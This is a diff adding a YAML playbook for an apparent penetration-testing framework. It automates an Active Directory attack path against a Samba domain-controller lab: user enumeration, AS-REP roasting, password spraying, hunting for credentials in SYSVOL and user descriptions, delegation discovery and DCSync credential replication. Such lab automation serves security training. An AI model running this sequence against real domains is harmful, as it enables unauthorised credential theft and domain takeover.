@@ -1,0 +1,135 @@
+name: apt_ad_lab_karrab
+version: 1
+description: 'AD lab full methodology path (Karrab AD methodology mapped to the Samba DC lab): policy, user oracles, roasting, spraying, credential-mining surfaces, delegation, DCSync validation.'
+enabled: true
+tags:
+- apt
+- ad-lab
+- samba
+- methodology
+platforms:
+- linux
+defaults:
+  lhost: 127.0.0.1
+  lport: '4444'
+  exploit: ''
+  vuln: ''
+steps:
+- id: scope
+  phase: recon
+  description: Bind the lab target.
+  run: assign target {target}
+- id: scan
+  phase: recon
+  description: Scan once and reuse the XML on later runs.
+  run: lazynmap {target}
+  skip_if_exists: sessions/scan_{target}.nmap.xml
+  timeout: 900
+- id: passpol
+  phase: enum
+  description: Domain password policy via null-session RPC (feeds spray safety).
+  run: python3 modules/atomic_exploit_bridge.py run --id ad_lab_passpol --rhost {target}
+    --lhost {lhost} --lport {lport} --port 445 --feed
+  timeout: 120
+  continue_on_error: true
+- id: ldap
+  phase: enum
+  description: LDAP domain enumeration (naming contexts and users).
+  run: python3 modules/atomic_exploit_bridge.py run --id ad_lab_ldap_enum --rhost {target}
+    --lhost {lhost} --lport {lport} --port 389 --feed
+  timeout: 120
+  continue_on_error: true
+- id: shares
+  phase: enum
+  description: SMB share discovery.
+  run: python3 modules/atomic_exploit_bridge.py run --id ad_lab_smb_shares --rhost {target}
+    --lhost {lhost} --lport {lport} --port 445 --feed
+  timeout: 120
+  continue_on_error: true
+- id: rid
+  phase: enum
+  description: Domain user enumeration via RID cycling.
+  run: python3 modules/atomic_exploit_bridge.py run --id ad_lab_rid_cycling --rhost {target}
+    --lhost {lhost} --lport {lport} --port 445 --feed
+  timeout: 180
+  continue_on_error: true
+- id: samr
+  phase: enum
+  description: Unauthenticated SAMR domain user enumeration via null session.
+  run: python3 modules/atomic_exploit_bridge.py run --id ad_lab_samr_enum --rhost {target}
+    --lhost {lhost} --lport {lport} --port 445 --feed
+  timeout: 120
+  continue_on_error: true
+- id: kerbrute
+  phase: enum
+  description: Kerberos pre-authentication username oracle (Karrab foothold input).
+  run: python3 modules/atomic_exploit_bridge.py run --id ad_lab_kerbrute_userenum --rhost {target}
+    --lhost {lhost} --lport {lport} --port 88 --feed
+  timeout: 120
+  continue_on_error: true
+- id: asreproast
+  phase: cred
+  description: AS-REP roastable account discovery (no-preauth, unauthenticated).
+  run: python3 modules/atomic_exploit_bridge.py run --id ad_lab_asreproast --rhost {target}
+    --lhost {lhost} --lport {lport} --port 389 --feed
+  timeout: 180
+  continue_on_error: true
+- id: spray
+  phase: cred
+  description: Policy-aware password spraying with the documented lab fixture password.
+  run: python3 modules/atomic_exploit_bridge.py run --id ad_lab_passspray --rhost {target}
+    --lhost {lhost} --lport {lport} --port 445 --feed
+  timeout: 180
+  continue_on_error: true
+- id: creds
+  phase: cred
+  description: Validate the lab default credential against SMB.
+  run: python3 modules/atomic_exploit_bridge.py run --id ad_lab_default_creds --rhost {target}
+    --lhost {lhost} --lport {lport} --port 445 --feed
+  timeout: 120
+  continue_on_error: true
+- id: gpp
+  phase: postexp
+  description: SYSVOL GPP cPassword sweep for legacy policy artifacts.
+  run: python3 modules/atomic_exploit_bridge.py run --id ad_lab_gpp_sysvol --rhost {target}
+    --lhost {lhost} --lport {lport} --port 445 --feed
+  timeout: 180
+  continue_on_error: true
+- id: userdesc
+  phase: postexp
+  description: Password hunting in AD user description fields.
+  run: python3 modules/atomic_exploit_bridge.py run --id ad_lab_user_desc_secrets --rhost {target}
+    --lhost {lhost} --lport {lport} --port 389 --feed
+  timeout: 120
+  continue_on_error: true
+- id: gmsa
+  phase: postexp
+  description: gMSA managed-password readability audit.
+  run: python3 modules/atomic_exploit_bridge.py run --id ad_lab_gmsa_enum --rhost {target}
+    --lhost {lhost} --lport {lport} --port 389 --feed
+  timeout: 120
+  continue_on_error: true
+- id: delegation
+  phase: privesc
+  description: Kerberos delegation surface discovery (unconstrained, constrained, RBCD).
+  run: python3 modules/atomic_exploit_bridge.py run --id ad_lab_delegation_enum --rhost {target}
+    --lhost {lhost} --lport {lport} --port 389 --feed
+  timeout: 120
+  continue_on_error: true
+- id: dcsync
+  phase: exfil
+  description: DCSync replication validation with the documented fixture administrator.
+  run: python3 modules/atomic_exploit_bridge.py run --id ad_lab_dcsync_validation --rhost {target}
+    --lhost {lhost} --lport {lport} --port 445 --feed
+  timeout: 300
+  continue_on_error: true
+- id: sync
+  phase: report
+  description: Mirror the loop graphs into world model and objectives.
+  run: lazy_sync
+  continue_on_error: true
+- id: session
+  phase: report
+  description: Refresh the C2 session report.
+  run: create_session_json
+  continue_on_error: true
